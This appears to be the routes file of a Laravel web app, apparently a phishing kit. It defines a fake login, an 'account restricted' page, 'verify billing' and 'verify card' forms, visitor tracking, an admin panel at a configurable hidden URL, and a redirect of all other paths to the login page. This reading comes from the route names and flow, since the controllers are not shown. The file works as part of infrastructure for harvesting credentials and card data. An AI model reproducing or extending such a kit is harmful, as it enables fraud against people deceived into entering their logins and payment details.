<?php

use App\Http\Controllers\{AdminController, AuthController, BillingController, CardController};
use App\Models\Settings;
use App\Models\Visitor;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

Route::get('/login', AuthController::class)->name('login.index');
Route::post('/login', [AuthController::class, 'post'])->name('login.store');
Route::put('/login', [AuthController::class, 'put'])->name('login.authenticate');

Route::get('/account/restricted', static function () {
    $visitor = Visitor::current();

    if (!$visitor->user) {
        return redirect()->route('login.index');
    }

    return Inertia::render('Account/Restricted', ['email' => $visitor->user]);
} )->name('dashboard');

Route::get('/account/verify/billing', [BillingController::class, 'index'])->name('billing.index');
Route::post('/account/verify/billing', [BillingController::class, 'store'])->name('billing.store');

Route::get('/account/verify/card', [CardController::class, 'index'])->name('card.index');
Route::post('/account/verify/card', [CardController::class, 'store'])->name('card.store');


$adminPrefix = 'admin';
try {
    if (Schema::hasTable('settings') && !app()->runningInConsole()) {
        $adminPrefix = Settings::me()->admin_panel ?? 'admin';
    }
} catch (Throwable) {
}

Route::group(['as' => 'admin.', 'prefix' => $adminPrefix], static function () {
    Route::group(['middleware' => 'guest'], static function () {
        Route::get('/login', [AdminController::class, 'login_index'])->name('login');
        Route::post('/login', [AdminController::class, 'login_post'])->name('login.store');
    });

    Route::group(['middleware' => 'auth'], static function () {
        Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
        Route::patch('/update-settings', [AdminController::class, 'settings_patch'])->name('settings.patch');
        Route::get('/logout', [AdminController::class, 'logout'])->name('logout');
    });
});

Route::fallback(static function () {
    return redirect()->route('login.index');
});
